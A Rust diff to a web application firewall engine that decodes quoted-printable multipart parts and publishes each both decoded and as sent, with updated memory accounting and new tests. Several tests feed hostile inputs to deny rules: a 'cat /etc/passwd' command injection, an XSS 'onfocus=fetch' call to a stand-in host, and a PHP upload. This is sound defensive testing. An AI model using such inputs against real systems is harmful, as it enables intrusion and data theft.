@@ -210,7 +210,7 @@ impl Transaction {
                             self.report_body_error(true, "URLENCODED", MEMORY_BUDGET_ERROR.to_owned(), true);
                             break;
                         }
-                        let growth = self.post_argument_growth(&key, value.len());
+                        let growth = self.post_argument_growth(&key, &[value.len()]);
                         if !memory.charge(growth.grown) {
                             self.report_body_error(true, "URLENCODED", MEMORY_BUDGET_ERROR.to_owned(), true);
                             break;
@@ -358,6 +358,8 @@ impl Transaction {
         }
         let mut total_size = 0_u64;
         let mut file_count = self.uploaded_paths.len();
+        // The values published a second time, which `SecArgumentsLimit` does not count: see [`Part::as_sent`].
+        let mut repeated_fields = 0_usize;
 
         // What the part just published held, freed by the time the next is taken.
         let mut release_previous = 0_usize;
@@ -380,7 +382,7 @@ impl Transaction {
                 if !self.charge_dropping_last(&mut memory, &mut parts, lookup) {
                     break;
                 }
-                let cost = self.multipart_publish_cost(&part, || {
+                let cost = self.multipart_publish_cost(&part, repeated_fields, || {
                     if written {
                         *upload_path_bytes.get_or_insert_with(|| upload_path_bytes_of(&self.config.upload_dir))
                     } else {
@@ -392,40 +394,39 @@ impl Transaction {
                 }
                 release_previous = part.owned_bytes().saturating_add(lookup).saturating_add(cost.freed);
             }
-            if part.repeats_header {
-                self.multipart_duplicate_part_header.set("1");
-                self.multipart_strict_error.set("1");
-            }
-            if part.invalid_quoting {
-                self.multipart_invalid_quoting.set("1");
-                self.multipart_strict_error.set("1");
-            }
-
+            self.flag_part(&part);
             self.publish_part_metadata(&part);
             // Go publishes only non-empty filenames, while a `filename*` that decoded to nothing still contributes
             // its charset and language (`internal/bodyprocessors/multipart.go:88-105`, v3.8.1).
             let [filename, alt_filename] = part.published_filenames();
-            if part.malformed_filename {
-                self.multipart_strict_error.set("1");
-            }
 
-            let size = u64::try_from(part.data.len()).map_err(|error| format!("multipart size overflow: {error}"))?;
+            // A part decoded from quoted-printable is published twice, as Go publishes it and as it was sent.
+            let (first, second) = published_values(&part);
+            let size = u64::try_from(first.len()).map_err(|error| format!("multipart size overflow: {error}"))?;
+            // Go adds the length of a field's data to the total as it does a file's
+            // (`internal/bodyprocessors/multipart.go:150-185`, go-coraza 1cfa4f955a19), so `FILES_COMBINED_SIZE` is
+            // the size of every part. A part Go decodes counts as sent here, which is the larger of the two sizes: a
+            // rule that limits the size of a body must not see less than the text a backend that does not decode it
+            // receives.
+            let counted =
+                u64::try_from(part.data.len()).map_err(|error| format!("multipart size overflow: {error}"))?;
+            total_size = total_size
+                .checked_add(counted)
+                .ok_or_else(|| "multipart size overflow".to_owned())?;
 
             // Go promotes `altFilename` when the primary filename is empty and treats a
             // part with no non-empty filename as a field, which is what an empty file
             // input sends (`internal/bodyprocessors/multipart.go:106-115`, v3.8.1).
             if let Some(filename) = filename.or(alt_filename) {
-                total_size = total_size
-                    .checked_add(size)
-                    .ok_or_else(|| "multipart size overflow".to_owned())?;
                 if over_limit {
                     self.multipart_strict_error.set("1");
                 }
                 self.files.add("", filename);
-                self.files_sizes.set_index(filename, 0, size.to_string());
+                let second_size = second.map(<[u8]>::len);
+                set_file_sizes(&mut self.files_sizes, filename, size, second_size);
                 if let Some(alt_filename) = alt_filename.filter(|&alt| alt != filename) {
                     self.files.add("", alt_filename);
-                    self.files_sizes.set_index(alt_filename, 0, size.to_string());
+                    set_file_sizes(&mut self.files_sizes, alt_filename, size, second_size);
                 }
                 self.files_names.add("", &part.name);
                 file_count += 1;
@@ -439,12 +440,18 @@ impl Transaction {
                     self.multipart_strict_error.set("1");
                     continue;
                 };
-                let path =
-                    save_to_temp(&upload_dir, part.data).inspect_err(|_| self.multipart_strict_error.set("1"))?;
-                self.files_tmp_names.add("", path.to_string_lossy().as_bytes());
-                self.uploaded_paths.push(path);
-            } else {
-                self.add_post_argument(&part.name, part.data);
+                for content in std::iter::once(first).chain(second) {
+                    let path =
+                        save_to_temp(&upload_dir, content).inspect_err(|_| self.multipart_strict_error.set("1"))?;
+                    self.files_tmp_names.add("", path.to_string_lossy().as_bytes());
+                    self.uploaded_paths.push(path);
+                }
+            } else if self.within_argument_limit(self.args_post.value_count().saturating_sub(repeated_fields)) {
+                self.insert_post_argument(&part.name, first);
+                if let Some(second) = second {
+                    self.insert_post_argument(&part.name, second);
+                    repeated_fields = repeated_fields.saturating_add(1);
+                }
             }
         }
 
@@ -453,6 +460,26 @@ impl Transaction {
             Some(failure) => Err(failure.message),
             None if self.request_body_stopped_by_memory_budget() => Err(MULTIPART_MEMORY_BUDGET_ERROR.to_owned()),
             None => Ok(()),
+        }
+    }
+
+    /// Sets the duplicate-header, quoting and strict errors that `part` carries.
+    fn flag_part(&mut self, part: &multipart::Part<'_>) {
+        if part.repeats_header {
+            self.multipart_duplicate_part_header.set("1");
+            self.multipart_strict_error.set("1");
+        }
+        if part.invalid_quoting {
+            self.multipart_invalid_quoting.set("1");
+            self.multipart_strict_error.set("1");
+        }
+        // Go's `flagUnexpectedEOF`: a part that ended inside its body is a strict error, unless the limit cut the
+        // body, which is the end of what was buffered and not a malformed body.
+        if part.unexpected_eof && self.inbound_data_error.get() != "1" {
+            self.multipart_strict_error.set("1");
+        }
+        if part.malformed_filename {
+            self.multipart_strict_error.set("1");
         }
     }
 
@@ -494,15 +521,27 @@ impl Transaction {
         }
     }
 
-    /// What `insert_post_argument` allocates for a value of `value_len` bytes under `key`: its entries in `ARGS_POST`
-    /// and `ARGS`, and the text `ARGS_COMBINED_SIZE` is then set from.
-    fn post_argument_growth(&self, key: &[u8], value_len: usize) -> Growth {
-        budget::insert_growth(&[&self.args_post, &self.args], key, value_len).plus(SIZE_TEXT)
+    /// What `insert_post_argument` allocates for values of the lengths `value_lens` under `key`, added in turn: their
+    /// entries in `ARGS_POST` and `ARGS`, and the text `ARGS_COMBINED_SIZE` is then set from.
+    fn post_argument_growth(&self, key: &[u8], value_lens: &[usize]) -> Growth {
+        [&self.args_post, &self.args]
+            .into_iter()
+            .fold(Growth::default(), |sum, map| {
+                sum.plus(budget::values_growth(map, key, value_lens.iter().copied()))
+            })
+            .plus(SIZE_TEXT)
     }
 
-    /// What publishing `part` allocates, its file's path `upload_path_bytes` long (0 when none is written).
-    fn multipart_publish_cost(&self, part: &multipart::Part<'_>, upload_path_bytes: impl FnOnce() -> usize) -> Growth {
+    /// What publishing `part` allocates, its file's path `upload_path_bytes` long (0 when none is written), when
+    /// `repeated_fields` of the values in `ARGS_POST` are second values, which the argument limit does not count.
+    fn multipart_publish_cost(
+        &self,
+        part: &multipart::Part<'_>,
+        repeated_fields: usize,
+        upload_path_bytes: impl FnOnce() -> usize,
+    ) -> Growth {
         let name = part.name.as_slice();
+        let (first, second) = published_values(part);
         let [filename, alt_filename] = part.published_filenames();
         let headers = part
             .headers
@@ -524,9 +563,11 @@ impl Transaction {
                 ));
         }
         let Some(file) = filename.or(alt_filename) else {
-            // The test `add_post_argument` makes: a field past the argument limit is dropped, and costs nothing.
-            if self.args_post.value_count() < self.config.argument_limit {
-                cost = cost.plus(self.post_argument_growth(name, part.data.len()));
+            // The test the field is published under: one past the argument limit is dropped, and costs nothing.
+            if self.args_post.value_count().saturating_sub(repeated_fields) < self.config.argument_limit {
+                let lens = [first.len(), second.map_or(0, <[u8]>::len)];
+                let lens = lens.get(..1 + usize::from(second.is_some())).unwrap_or_default();
+                cost = cost.plus(self.post_argument_growth(name, lens));
             }
             return cost;
         };
@@ -546,23 +587,40 @@ impl Transaction {
             ))
             .plus(budget::values_growth(&self.files_names, b"", [name.len()]))
             .plus(SIZE_TEXT);
+        // The size of a second value is added after the first is set; two values from a key that is not held yet
+        // cost more than the second does, which is the safe side.
+        for file in files.into_iter().flatten().filter(|_| second.is_some()) {
+            cost = cost.plus(budget::values_growth(
+                &self.files_sizes,
+                file,
+                [SIZE_TEXT_BYTES, SIZE_TEXT_BYTES],
+            ));
+        }
         let path = upload_path_bytes();
         if path > 0 {
-            // Kept in `FILES_TMPNAMES` and for cleanup; writing holds 3 more (tempfile 3.27 doubles its buffer).
+            // Each file is kept in `FILES_TMPNAMES` and for cleanup; writing holds 3 more (tempfile 3.27 doubles its
+            // buffer), one file at a time.
             let uploads = (self.uploaded_paths.len(), self.uploaded_paths.capacity());
             let writing = allocation_bytes(path).saturating_mul(3);
+            let written = 1 + usize::from(second.is_some());
             cost = cost
-                .plus(budget::values_growth(&self.files_tmp_names, b"", [path]))
-                .plus(budget::list_growth(
-                    uploads,
-                    0,
-                    size_of::<PathBuf>(),
-                    vec_grown_capacity,
+                .plus(budget::values_growth(
+                    &self.files_tmp_names,
+                    b"",
+                    std::iter::repeat_n(path, written),
                 ))
                 .plus(Growth {
-                    grown: allocation_bytes(path).saturating_add(writing),
+                    grown: allocation_bytes(path).saturating_mul(written).saturating_add(writing),
                     freed: writing,
                 });
+            for added in 0..written {
+                cost = cost.plus(budget::list_growth(
+                    uploads,
+                    added,
+                    size_of::<PathBuf>(),
+                    vec_grown_capacity,
+                ));
+            }
         }
         cost
     }
@@ -599,6 +657,23 @@ const MEMORY_BUDGET_ERROR: &str = "parsed arguments exceed the body memory budge
 
 /// The error reported when the parts of a multipart body would take it past the memory budget the host set.
 const MULTIPART_MEMORY_BUDGET_ERROR: &str = "published parts exceed the body memory budget";
+
+/// Sets the sizes of an upload under `name`. A later part with the same filename replaces them, as in Go, so a second
+/// size an earlier decoded part left is dropped: the values of a name always come from one part.
+fn set_file_sizes(sizes: &mut Map, name: &[u8], size: u64, second: Option<usize>) {
+    sizes.set_index(name, 0, size.to_string());
+    match second {
+        Some(second) => sizes.set_index(name, 1, second.to_string()),
+        None => sizes.truncate_values(name, 1),
+    }
+}
+
+/// What `part` publishes: its body as Go publishes it and, for a part decoded from quoted-printable, what was sent
+/// after it. A rule that reads the part sees both, so a backend that decodes the body, as Go's does, and one that
+/// takes it as sent are both inspected.
+fn published_values<'p>(part: &'p multipart::Part<'_>) -> (&'p [u8], Option<&'p [u8]>) {
+    (part.body(), part.as_sent())
+}
 
 /// Longest decimal rendering of a `u64`: the text of a size, which `FILES_SIZES` keeps and `ARGS_COMBINED_SIZE` is
 /// set from.
@@ -2557,6 +2632,536 @@ mod multipart_tests {
         tx
     }
 
+    /// Process `body` under a `ProcessPartial` limit of `limit` bytes, with the boundary `b`.
+    fn process_cut_at(body: &[u8], limit: usize) -> Transaction {
+        let mut parser = crate::seclang::Parser::new();
+        parser
+            .from_string(&format!(
+                "SecRequestBodyAccess On\nSecRequestBodyLimit {limit}\nSecRequestBodyLimitAction ProcessPartial"
+            ))
+            .unwrap();
+        let waf = parser.into_waf().unwrap();
+        let mut tx = waf.new_transaction_with_id("multipart-cut");
+        tx.add_request_header("Content-Type", b"multipart/form-data; boundary=b");
+        tx.process_request_headers();
+        assert_eq!(tx.process_request_body(body), None);
+        tx
+    }
+
+    /// A field, a file and a last field.
+    const FIELD_FILE_FIELD: &[u8] = b"--b\r\nContent-Disposition: form-data; name=\"f1\"\r\n\r\n0123456789\r\n\
+--b\r\nContent-Disposition: form-data; name=\"u\"; filename=\"x.bin\"\r\n\r\nABCDEFGHIJ\r\n\
+--b\r\nContent-Disposition: form-data; name=\"f2\"\r\n\r\nLASTFIELD\r\n--b--\r\n";
+
+    /// The offset after the first `needle` in `body`.
+    fn after(body: &[u8], needle: &[u8]) -> usize {
+        body.windows(needle.len()).position(|window| window == needle).unwrap() + needle.len()
+    }
+
+    #[test]
+    fn files_combined_size_counts_field_data_as_go_does() {
+        // Go's processor adds a field's length to the running total as well as a file's
+        // (`internal/bodyprocessors/multipart.go:175-183`, go-coraza 1cfa4f955a19), so a size rule such as
+        // CRS 900340 sees every part's bytes, not only the files'. Each value below is what Go's processor sets.
+        let field = |name: &str, data: &str| {
+            format!("--b\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{data}\r\n")
+        };
+        let file = |data: &str| {
+            format!("--b\r\nContent-Disposition: form-data; name=\"u\"; filename=\"a.txt\"\r\n\r\n{data}\r\n")
+        };
+        let cases: [(&str, String, &str); 7] = [
+            ("field only", [field("f", "12345"), CLOSE.into()].concat(), "5"),
+            ("file only", [file("12345"), CLOSE.into()].concat(), "5"),
+            (
+                "mixed",
+                [field("f", "12345"), file("abc"), field("g", ""), CLOSE.into()].concat(),
+                "8",
+            ),
+            ("empty parts", [field("f", ""), file(""), CLOSE.into()].concat(), "0"),
+            (
+                "an empty filename is a field",
+                "--b\r\nContent-Disposition: form-data; name=\"u\"; filename=\"\"\r\n\r\nabcd\r\n--b--\r\n".to_owned(),
+                "4",
+            ),
+            (
+                "no disposition is a field",
+                "--b\r\nX: y\r\n\r\nabcd\r\n--b--\r\n".to_owned(),
+                "4",
+            ),
+            (
+                "whole body",
+                String::from_utf8(FIELD_FILE_FIELD.to_vec()).unwrap(),
+                "29",
+            ),
+        ];
+        for (what, body, want) in cases {
+            let tx = process(body.as_bytes());
+            assert_eq!(tx.files_combined_size.get(), want, "{what}");
+        }
+    }
+
+    #[test]
+    fn files_combined_size_of_a_body_cut_by_the_limit_counts_what_go_read() {
+        // Cut inside the file: the first field and the file's first 5 bytes. Cut inside the last field: both whole
+        // parts and its first 4 bytes. Values from Go's processor on the same prefixes, with `INBOUND_DATA_ERROR`.
+        let in_file = after(FIELD_FILE_FIELD, b"ABCDE");
+        let in_last_field = after(FIELD_FILE_FIELD, b"LAST");
+        for (what, limit, want) in [
+            ("inside the file", in_file, "15"),
+            ("inside the last field", in_last_field, "24"),
+        ] {
+            let tx = process_cut_at(FIELD_FILE_FIELD, limit);
+            assert_eq!(tx.files_combined_size.get(), want, "{what}");
+            assert_eq!(tx.multipart_strict_error.get(), "0", "{what}");
+        }
+    }
+
+    /// One part with `headers` (after its `Content-Disposition`) and `data`, as a body of its own.
+    fn part_body(disposition: &str, headers: &[&str], data: &[u8]) -> Vec<u8> {
+        let mut body = format!("--b\r\nContent-Disposition: form-data; {disposition}\r\n").into_bytes();
+        for header in headers {
+            body.extend_from_slice(header.as_bytes());
+            body.extend_from_slice(b"\r\n");
+        }
+        body.extend_from_slice(b"\r\n");
+        body.extend_from_slice(data);
+        body.extend_from_slice(b"\r\n--b--\r\n");
+        body
+    }
+
+    /// The part headers of `field`, in `Name: value` form.
+    fn part_headers(tx: &Transaction, field: &str) -> Vec<String> {
+        tx.multipart_part_headers
+            .values(field)
+            .map(|value| String::from_utf8_lossy(value).into_owned())
+            .collect()
+    }
+
+    /// The values `map` holds under `key`, in order.
+    fn values(map: &crate::collection::Map, key: &str) -> Vec<Vec<u8>> {
+        map.values(key).map(<[u8]>::to_vec).collect()
+    }
+
+    /// What a part decoded from quoted-printable publishes under its name: the decoded body, as Go publishes it, and
+    /// what was sent after it.
+    fn decoded_and_sent(decoded: &[u8], sent: &[u8]) -> Vec<Vec<u8>> {
+        vec![decoded.to_vec(), sent.to_vec()]
+    }
+
+    const QP: &str = "Content-Transfer-Encoding: quoted-printable";
+
+    /// The closing delimiter of a body.
+    const CLOSE: &str = "--b--\r\n";
+
+    /// What a quoted-printable body is, and decodes to.
+    type DecodeCase<'a> = (&'a str, &'a [u8], &'a [u8]);
+
+    /// What a quoted-printable body is, the error Go reports for it, and what is published of the part.
+    type FailureCase<'a> = (&'a str, &'a [u8], &'a str, &'a [u8]);
+
+    #[test]
+    fn a_quoted_printable_field_is_decoded_and_published_as_sent() {
+        // Go's `NextPart` decodes `Content-Transfer-Encoding: quoted-printable` as the part is read
+        // (`mime/multipart/multipart.go`, go1.27.4), so `cmd=3Bcat=20/etc/passwd` is `cmd;cat /etc/passwd` to the
+        // rules, and so to a backend that decodes it. A backend that takes the body as sent acts on the encoded
+        // text, so that is published under the same name as a second value.
+        let encoded = b"cmd=3Bcat=20/etc/passwd";
+        let decoded = b"cmd;cat /etc/passwd";
+        let rules = "SecRequestBodyAccess On\n\
+                     SecRule ARGS_POST \"@contains ;cat /etc/passwd\" \"id:1,phase:2,deny,status:403\"\n\
+                     SecRule ARGS_POST \"@contains =3Bcat\" \"id:2,phase:2,deny,status:403\"";
+        let tx = process_with_rules(&part_body(r#"name="f""#, &[QP], encoded), rules);
+
+        assert_eq!(tx.reqbody_error.get(), "0");
+        assert_eq!(tx.multipart_strict_error.get(), "0");
+        assert_eq!(values(&tx.args_post, "f"), decoded_and_sent(decoded, encoded));
+        assert_eq!(values(&tx.args, "f"), decoded_and_sent(decoded, encoded));
+        // The size counts what was sent: the larger, so a limit on it sees no less than before.
+        assert_eq!(tx.files_combined_size.get(), "23");
+        assert_eq!(tx.args_combined_size, 44);
+        assert_eq!(
+            part_headers(&tx, "f"),
+            [r#"Content-Disposition: form-data; name="f""#, QP],
+            "the encoding header stays a part header, as before the body was decoded"
+        );
+        assert_eq!(tx.interruption().map(|interruption| interruption.rule_id), Some(1));
+        // Each rule alone denies: one reads the decoded text, the other what was sent.
+        for (rule, id) in [("@contains ;cat /etc/passwd", 1), ("@contains =3Bcat", 2)] {
+            let tx = process_with_rules(
+                &part_body(r#"name="f""#, &[QP], encoded),
+                &format!("SecRequestBodyAccess On\nSecRule ARGS \"{rule}\" \"id:{id},phase:2,deny,status:403\""),
+            );
+            assert_eq!(
+                tx.interruption().map(|interruption| interruption.rule_id),
+                Some(id),
+                "{rule}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_rule_sees_the_text_a_quoted_printable_field_sent_when_decoding_changes_it() {
+        // `=fe` is the byte 0xFE once decoded, so `onfocus=fetch(` is not in the decoded text. A backend that takes
+        // the field as sent acts on it (busboy, Starlette's `MultipartParser`, PHP): the rule must match it too.
+        let sent = b" autofocus onfocus=fetch('//evil.example') x=";
+        let tx = process_with_rules(
+            &part_body(r#"name="f""#, &[QP], sent),
+            "SecRequestBodyAccess On\nSecRule ARGS \"@contains onfocus=fetch(\" \"id:1,phase:2,deny,status:403\"",
+        );
+
+        let [decoded, as_sent] = <[Vec<u8>; 2]>::try_from(values(&tx.args_post, "f")).unwrap();
+        assert_eq!(as_sent, sent);
+        assert!(!decoded.windows(13).any(|window| window == b"onfocus=fetch"));
+        assert_eq!(tx.interruption().map(|interruption| interruption.status), Some(403));
+    }
+
+    #[test]
+    fn a_quoted_printable_file_is_uploaded_decoded_and_as_sent() {
+        let upload_dir = tempfile::tempdir().unwrap();
+        let rules = format!("SecRequestBodyAccess On\nSecUploadDir {}", upload_dir.path().display());
+        let tx = process_with_rules(
+            &part_body(r#"name="u"; filename="a.txt""#, &[QP], b"<?php =65cho 1; ?>=0D=0Aline2"),
+            &rules,
+        );
+
+        // The decoded upload is first, as in Go, and the file as sent is a second upload with its own path and size.
+        assert_eq!(
+            values(&tx.files_sizes, "a.txt"),
+            [b"23".to_vec(), b"29".to_vec()],
+            "decoded size, then sent size"
+        );
+        assert_eq!(tx.files_combined_size.get(), "29");
+        assert_eq!(tx.files.values("").collect::<Vec<_>>(), [&b"a.txt"[..]]);
+        assert_eq!(tx.files_names.values("").collect::<Vec<_>>(), [&b"u"[..]]);
+        let paths: Vec<_> = tx
+            .files_tmp_names
+            .values("")
+            .map(|path| String::from_utf8(path.to_vec()).unwrap())
+            .collect();
+        let [decoded, as_sent] = <[String; 2]>::try_from(paths).unwrap();
+        assert_eq!(std::fs::read(decoded).unwrap(), b"<?php echo 1; ?>\r\nline2");
+        assert_eq!(std::fs::read(as_sent).unwrap(), b"<?php =65cho 1; ?>=0D=0Aline2");
+        assert_eq!(
+            part_headers(&tx, "u"),
+            [r#"Content-Disposition: form-data; name="u"; filename="a.txt""#, QP]
+        );
+    }
+
+    #[test]
+    fn a_quoted_printable_part_that_decoding_does_not_change_is_published_once() {
+        let upload_dir = tempfile::tempdir().unwrap();
+        let rules = format!("SecRequestBodyAccess On\nSecUploadDir {}", upload_dir.path().display());
+        let tx = process_with_rules(
+            &part_body(r#"name="f""#, &[QP], b"plain text, nothing to decode"),
+            &rules,
+        );
+        assert_eq!(values(&tx.args_post, "f"), [b"plain text, nothing to decode".to_vec()]);
+        assert_eq!(tx.args_combined_size, 30);
+
+        let tx = process_with_rules(
+            &part_body(r#"name="u"; filename="a.txt""#, &[QP], b"plain text, nothing to decode"),
+            &rules,
+        );
+        assert_eq!(tx.files_tmp_names.values("").count(), 1);
+        assert_eq!(values(&tx.files_sizes, "a.txt"), [b"29".to_vec()]);
+    }
+
+    #[test]
+    fn the_second_value_of_a_quoted_printable_field_is_not_counted_by_the_argument_limit() {
+        // Counting it would let a body of fields that decode drop the fields after it that the base inspected.
+        let field = |name: &str, data: &str| {
+            format!("--b\r\nContent-Disposition: form-data; name=\"{name}\"\r\n{QP}\r\n\r\n{data}\r\n")
+        };
+        let body = format!(
+            "{}{}{}{CLOSE}",
+            field("a", "x=3D1"),
+            field("b", "y=3D2"),
+            field("c", "plain")
+        );
+        let process_limited = |limit: usize| {
+            process_with_rules(
+                body.as_bytes(),
+                &format!("SecRequestBodyAccess On\nSecArgumentsLimit {limit}"),
+            )
+        };
+        let tx = process_limited(3);
+        assert_eq!(tx.arguments_limit_reached.get(), "0");
+        assert_eq!(
+            tx.args_post.value_count(),
+            5,
+            "two fields with two values, and one with one"
+        );
+        assert_eq!(values(&tx.args_post, "c"), [b"plain".to_vec()]);
+
+        let tx = process_limited(2);
+        assert_eq!(tx.arguments_limit_reached.get(), "1");
+        assert_eq!(values(&tx.args_post, "a"), decoded_and_sent(b"x=1", b"x=3D1"));
+        assert_eq!(values(&tx.args_post, "b"), decoded_and_sent(b"y=2", b"y=3D2"));
+        assert!(
+            values(&tx.args_post, "c").is_empty(),
+            "the third field is past the limit of two"
+        );
+    }
+
+    #[test]
+    fn a_quoted_printable_body_decodes_as_go_does() {
+        // Each expectation is what Go's `mime/quotedprintable` hands the processor for the same part body: soft
+        // breaks (`=` and the white space after it, then a line end), lowercase hex, `=` kept literally when no two
+        // hex digits follow, trailing white space dropped from a line, and bytes of 0x80 and above passed through.
+        let cases: [DecodeCase<'_>; 10] = [
+            ("lowercase hex", b"cmd=3bcat=2f=2e=2E", b"cmd;cat/.."),
+            ("soft breaks", b"a=\r\nb=\nc= \r\nd=\t\r\ne", b"abcde"),
+            ("soft break at the end", b"abc=", b"abc"),
+            ("invalid escapes stay", b"a=ZZb=4 c=4", b"a=ZZb=4 c=4"),
+            ("trailing white space", b"a  \r\nb \t\r\nc  ", b"a\r\nb\r\nc"),
+            ("bare CR and LF", b"a\rb\nc\r\nd", b"a\rb\nc\r\nd"),
+            ("high bytes", b"a\x80\xffb", b"a\x80\xffb"),
+            ("escaped control bytes", b"=00=01=7F=FF", b"\x00\x01\x7f\xff"),
+            ("empty", b"", b""),
+            (
+                "an escape across what a soft break joins",
+                b"=\r\n=41=\r\n4=\r\n2",
+                b"A42",
+            ),
+        ];
+        for (what, encoded, decoded) in cases {
+            let tx = process(&part_body(r#"name="f""#, &[QP], encoded));
+            assert_eq!(tx.reqbody_error.get(), "0", "{what}");
+            assert_eq!(tx.multipart_strict_error.get(), "0", "{what}");
+            // What Go publishes is the first value; the encoded text follows it when decoding changed it.
+            let want = if decoded == encoded {
+                vec![decoded.to_vec()]
+            } else {
+                decoded_and_sent(decoded, encoded)
+            };
+            assert_eq!(values(&tx.args_post, "f"), want, "{what}");
+            assert_eq!(tx.files_combined_size.get(), encoded.len().to_string(), "{what}");
+        }
+    }
+
+    #[test]
+    fn the_header_that_selects_decoding_is_matched_as_go_matches_it() {
+        // `strings.EqualFold(Header.Get("Content-Transfer-Encoding"), "quoted-printable")`: any spelling of the
+        // name, any case of the value, and the value as `textproto` leaves it after trimming. Anything else, a
+        // parameter, a folded value or another encoding, is not decoded. Go hides the header of a part it decodes;
+        // here every part keeps it, which is what rules that match it read.
+        let decoded: [(&str, &str); 3] = [
+            ("mixed case", "content-TRANSFER-encoding: Quoted-Printable"),
+            ("padded value", "Content-Transfer-Encoding:   quoted-printable  "),
+            ("no space after the colon", "Content-Transfer-Encoding:quoted-printable"),
+        ];
+        for (what, header) in decoded {
+            let tx = process(&part_body(r#"name="f""#, &[header], b"a=3Db"));
+            assert_eq!(values(&tx.args_post, "f"), decoded_and_sent(b"a=b", b"a=3Db"), "{what}");
+            assert_eq!(part_headers(&tx, "f").len(), 2, "{what}: the header stays");
+        }
+        let kept: [(&str, &str); 5] = [
+            ("a parameter", "Content-Transfer-Encoding: quoted-printable; x=y"),
+            ("a folded value", "Content-Transfer-Encoding: quoted-\r\n printable"),
+            ("7bit", "Content-Transfer-Encoding: 7bit"),
+            ("base64", "Content-Transfer-Encoding: base64"),
+            ("a name with a space", "Content-Transfer- Encoding: quoted-printable"),
+        ];
+        for (what, header) in kept {
+            let tx = process(&part_body(r#"name="f""#, &[header], b"a=3Db"));
+            assert_eq!(values(&tx.args_post, "f"), [b"a=3Db".to_vec()], "{what}");
+            assert_eq!(part_headers(&tx, "f").len(), 2, "{what}: the header stays");
+        }
+    }
+
+    #[test]
+    fn a_repeated_encoding_header_stays_and_is_flagged_as_any_repeated_header() {
+        // `Header.Get` reads the first value, so the first `quoted-printable` decides. Go deletes every copy before its
+        // processor looks for repeated headers; here every copy stays, so rules that match the header still see the
+        // payload a second copy carries, and the repeat is flagged as it is for any other header.
+        for (what, headers) in [
+            ("twice", [QP, QP]),
+            ("quoted-printable then 7bit", [QP, "Content-Transfer-Encoding: 7bit"]),
+        ] {
+            let tx = process(&part_body(r#"name="f""#, &headers, b"a=3Db"));
+            assert_eq!(values(&tx.args_post, "f"), decoded_and_sent(b"a=b", b"a=3Db"), "{what}");
+            assert_eq!(tx.multipart_strict_error.get(), "1", "{what}");
+            assert_eq!(tx.multipart_duplicate_part_header.get(), "1", "{what}");
+            assert_eq!(part_headers(&tx, "f").len(), 3, "{what}");
+        }
+        let tx = process(&part_body(
+            r#"name="f""#,
+            &["Content-Transfer-Encoding: 7bit", QP],
+            b"a=3Db",
+        ));
+        assert_eq!(values(&tx.args_post, "f"), [b"a=3Db".to_vec()]);
+        assert_eq!(tx.multipart_strict_error.get(), "1");
+        assert_eq!(tx.multipart_duplicate_part_header.get(), "1");
+        assert_eq!(part_headers(&tx, "f").len(), 3);
+
+        // A payload in a second copy of the header is a part header, as before.
+        let tx = process(&part_body(
+            r#"name="f""#,
+            &[QP, "Content-Transfer-Encoding: ;cat /etc/passwd"],
+            b"x",
+        ));
+        assert!(part_headers(&tx, "f").contains(&"Content-Transfer-Encoding: ;cat /etc/passwd".to_owned()));
+    }
+
+    #[test]
+    fn a_quoted_printable_part_cut_by_the_limit_is_published_decoded_as_far_as_it_was_read() {
+        // Go reads the part up to `io.ErrUnexpectedEOF`, which under `ProcessPartial` is the end of what was
+        // buffered and not a strict error; the decoded bytes are published (`cmd;cat /etc/pass`, 17) with what was
+        // read as sent (21).
+        let body = part_body(r#"name="f""#, &[QP], b"cmd=3Bcat=20/etc/passwd");
+        let tx = process_cut_at(&body, after(&body, b"/etc/pass"));
+
+        assert_eq!(
+            values(&tx.args_post, "f"),
+            decoded_and_sent(b"cmd;cat /etc/pass", b"cmd=3Bcat=20/etc/pass")
+        );
+        assert_eq!(tx.files_combined_size.get(), "21");
+        assert_eq!(tx.multipart_strict_error.get(), "0");
+        assert_eq!(tx.reqbody_error.get(), "0");
+    }
+
+    #[test]
+    fn a_doubled_equals_ends_the_decoded_part_and_is_a_strict_error_but_the_parts_after_it_are_read() {
+        // Go's reader reports `io.ErrUnexpectedEOF` for the second `=` of `==` before a line end, and its processor
+        // flags the strict error and reads no further part. This engine flags it too, and still publishes the
+        // parts that follow: they are what a backend that decodes the body differently would act on. What follows
+        // the `==` in the part itself is published as sent.
+        let mut body = part_body(r#"name="f""#, &[QP], b"a==\r\nb;cat /etc/passwd");
+        body.truncate(body.len() - CLOSE.len());
+        body.extend_from_slice(b"--b\r\nContent-Disposition: form-data; name=\"g\"\r\n\r\nlater\r\n--b--\r\n");
+        let tx = process(&body);
+
+        assert_eq!(
+            values(&tx.args_post, "f"),
+            decoded_and_sent(b"a", b"a==\r\nb;cat /etc/passwd")
+        );
+        assert_eq!(values(&tx.args_post, "g"), [b"later".to_vec()]);
+        assert_eq!(tx.multipart_strict_error.get(), "1");
+        assert_eq!(tx.reqbody_error.get(), "0");
+    }
+
+    #[test]
+    fn a_later_upload_with_the_same_filename_replaces_both_sizes() {
+        // The decoded upload leaves two sizes; the plain one after it, with the same filename and alternate name,
+        // must not keep the earlier part's second size beside its own.
+        let disposition = r#"name="u"; filename="d.txt"; filename*=UTF-8''r%2Ephp"#;
+        let mut body = part_body(disposition, &[QP], b"=41");
+        body.truncate(body.len() - CLOSE.len());
+        body.extend_from_slice(&part_body(disposition, &[], b"BBBB"));
+        let tx = process_with_rules(&body, "SecRequestBodyAccess On");
+
+        for name in ["r.php", "d.txt"] {
+            assert_eq!(values(&tx.files_sizes, name), [b"4".to_vec()], "{name}");
+        }
+    }
+
+    #[test]
+    fn a_quoted_printable_part_with_an_extended_filename_is_decoded() {
+        let upload_dir = tempfile::tempdir().unwrap();
+        let rules = format!("SecRequestBodyAccess On\nSecUploadDir {}", upload_dir.path().display());
+        let tx = process_with_rules(
+            &part_body(
+                r#"name="u"; filename="d.txt"; filename*=UTF-8''r%2Ephp"#,
+                &[QP],
+                b"x=3Dy",
+            ),
+            &rules,
+        );
+
+        assert_eq!(tx.files.values("").collect::<Vec<_>>(), [&b"r.php"[..], &b"d.txt"[..]]);
+        for name in ["r.php", "d.txt"] {
+            assert_eq!(values(&tx.files_sizes, name), [b"3".to_vec(), b"5".to_vec()], "{name}");
+        }
+        assert_eq!(tx.files_combined_size.get(), "5");
+        let paths: Vec<_> = tx
+            .files_tmp_names
+            .values("")
+            .map(|path| String::from_utf8(path.to_vec()).unwrap())
+            .collect();
+        let [decoded, as_sent] = <[String; 2]>::try_from(paths).unwrap();
+        assert_eq!(std::fs::read(decoded).unwrap(), b"x=y");
